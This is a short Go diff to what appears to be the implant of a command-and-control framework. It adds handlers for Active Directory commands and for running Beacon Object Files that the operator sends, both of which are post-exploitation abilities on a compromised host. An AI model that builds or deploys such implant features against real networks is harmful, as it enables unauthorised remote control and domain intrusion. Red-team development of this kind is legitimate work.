@@ -156,6 +156,29 @@ func (imp *Implant) executeTask(task protocol.Task) *protocol.TaskResult {
 			err = errMissingArgs("cd requires path")
 		}
 
+	case protocol.TaskAD:
+		if len(task.Args) > 0 {
+			adCmds := GetADCommands()
+			if adCmd, ok := adCmds[task.Args[0]]; ok {
+				output, err = adCmd.Executor(task.Args[1:])
+			} else {
+				err = errMissingArgs("unknown AD command: " + task.Args[0])
+			}
+		} else {
+			err = errMissingArgs("ad requires command name")
+		}
+
+	case protocol.TaskBOF:
+		if len(task.Data) > 0 {
+			var bofArgs []byte
+			if len(task.Args) > 0 {
+				bofArgs = PackBOFArgs(NewBOFStringArg(task.Args[0]))
+			}
+			output, err = ExecuteBOF(task.Data, bofArgs)
+		} else {
+			err = errMissingArgs("bof requires object file data")
+		}
+
 	case protocol.TaskKill:
 		output = []byte("Agent terminating")
 
